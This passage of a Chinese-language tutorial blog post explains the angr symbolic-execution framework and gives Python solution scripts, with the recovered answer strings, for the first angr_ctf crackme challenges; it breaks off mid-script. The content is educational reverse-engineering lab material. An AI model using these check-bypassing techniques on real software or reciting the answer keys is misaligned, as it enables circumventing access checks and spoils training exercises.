设置端序，可以直接 project.arch.memory_endness 获取程序端序</p><pre class="line-numbers language-none"><code class="language-none">LE – 小端序(little endian, least significant byte is stored at lowest address)BE – 大端序(big endian, most significant byte is stored at lowest address)ME – 中间序(Middle-endian. Yep.)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="文件内容符号化"><a href="#文件内容符号化" class="headerlink" title="文件内容符号化"></a>文件内容符号化</h5><p>仿真文件系统并插入文件，blank_state 从打开文件部分地址开始</p><p>symbolic_file_size_bytes 是文件中的内容长度，passwd_file 是实际读出的长度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#形成符号化的文件格式</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token operator">=</span>passwd0<span class="token punctuation">,</span> size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h4><p>在实际的测试生产中符号执行技术存在约束求解问题和路径爆炸问题，当程序存在循环结构的时候即使是简单逻辑也可能产生规模巨大的执行路径导致路径爆炸，所以需要提供更多的约束控制路径爆炸问题</p><h5 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h5><p>用字符串直接比较约束取代循环判断函数， angr 提供加入约束条件的方法 <code>state.solver.add</code> ，将每个符号化的布尔值作为一个关于符号变量合法性的断言</p><p>示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x <span class="token operator">-</span> y <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>y <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token number">5</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法：expolre 的 find 地址设置为比较函数的地址，load 的 size 设置为字符串长度，不需要 * 8</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从地址中加载值</span>res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token comment">#加入限制：加载值等于固定值</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h5><p>可以使用 hook 直接改写函数，hook engine 是 angr 使用的引擎 SimEngine 的子类，默认情况下用 SimProcedures 中的符号摘要替换库函数设置 hooking，可以通过 <code>angr.procedures</code> 或 <code>angr.SimProcedures</code> 查看列表</p><p>SimProcedure 就是 hook 机制，可以通过 <code>project.hook(addr, hook)</code> 设置，其中 hook 是一个 SimProcedure 实例，通过 <code>.is_hooked / .unhook / .hook_py</code> 进行管理，将 <code>project.hook(addr)</code> 作为函数装饰器可以编写自己的 hook 函数，还可以通过 <code>project.hook_symbol(name, hook)</code> hook 函数</p><p>用法：一参是需要 hook 的调用函数的地址，二参是调用函数 <code>call func</code> 到下一条指令之间的长度，函数参数是 state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> @project<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x1234</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">set_rax</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回值用 <code>claripy.BVV(value, size)</code> ，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>            user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="利用函数名hook"><a href="#利用函数名hook" class="headerlink" title="利用函数名hook"></a>利用函数名hook</h5><p>在函数被多次调用的时候利用函数名 hook 而不需要使用函数调用地址</p><p>每个程序都有一个符号表，angr 可以使用 <code>Project.hook_symbol</code> 解析出每个导入符号的地址，用自己的代码替换函数</p><p>用法：<code>project.hook_symbol</code> 一参是函数名，二参是自定义的类，类参数是 <code>angr.SimProcedure</code>，类中定义 run 函数的一参是 self，其他参数可以直接用参数的参数，例如这里 check_equals_symbol 函数有参数 to_check 和 length，加载内存的 state 用 self.state，最后不需要设置 rax 直接 return 即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ReplacementCheckEquals</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> to_check<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>            user_input_buffer_address <span class="token operator">=</span> to_check            user_input_buffer_length <span class="token operator">=</span> length            user_input_string <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>                user_input_buffer_address<span class="token punctuation">,</span>                user_input_buffer_length            <span class="token punctuation">)</span>            check_against_string <span class="token operator">=</span> <span class="token string">'ORSDDWXHZURJRBDH'</span>            <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>                user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        check_equals_symbol <span class="token operator">=</span> <span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>check_equals_symbol<span class="token punctuation">,</span> ReplacementCheckEquals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook-scanf应对复杂输入"><a href="#hook-scanf应对复杂输入" class="headerlink" title="hook scanf应对复杂输入"></a>hook scanf应对复杂输入</h5><p>用法：调用带有全局状态的 globals 插件，保存对符号值的引用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="angr-ctf-题解"><a href="#angr-ctf-题解" class="headerlink" title="angr_ctf 题解"></a>angr_ctf 题解</h2><p>项目地址：<a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a></p><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>目标地址是输出good job，输出能够到达目标地址的第一个输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./00_angr_find'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x8048675</span>avoid_address <span class="token operator">=</span> <span class="token number">0x8048666</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#JXWVXRKX</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p>有很多分支会调用 avoid_me 函数，放到 avoid 参数里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./01_angr_avoid'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x80485E0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x80485A8</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#HUJOZMYS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>程序中出现多次 Try again 和 Good job，避免记录所有的 Good job地址，将对两种情况的判断写成函数作为 find 和 avoid 的参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./02_angr_find_condition'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#HETOBRCU</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h3><p>本题使用 scanf 输入了三个十六进制数，angr 对 scanf 的复杂输入处理的不是很好，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%x %x %x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而输入后的参数会传递给寄存器 eax ebx edx</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:08048937                 mov     ecx, [ebp+var_18].text:0804893A                 mov     eax, ecx.text:0804893C                 mov     ecx, [ebp+var_14].text:0804893F                 mov     ebx, ecx.text:08048941                 mov     ecx, [ebp+var_10]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入函数返回后通过这三个寄存器传递给栈</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0804897B                 call    get_user_input.text:08048980                 mov     [ebp+var_14], eax.text:08048983                 mov     [ebp+var_10], ebx.text:08048986                 mov     [ebp+var_C], edx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以将三个寄存器符号化注入，从传递寄存器参数给栈的位置开始执行，避开 scanf 输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./03_angr_symbolic_registers'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048980</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> arg1initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> arg2initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> arg3simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token comment">#simgr = project.factory.simgr(initial_state)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0xb9ffd04e</span><span class="token comment">#0xccf63fe8</span><span class="token comment">#0x8fd4d959</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p>栈符号化，不能直接使用regs，通过计算构造esp和ebp在合适的位置 stack_push 入栈</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./04_angr_symbolic_stack'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048697</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebpinitial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#1704280884</span><span class="token comment">#2382341151</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><p>主要是用到<code>initial_state.memory.store(addr, arg)</code>，将指定位置的变量符号化</p><p><code>%8s</code> -&gt; 8 字符，一个字符 8 字节，所以长度是 64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./05_angr_symbolic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048601</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token 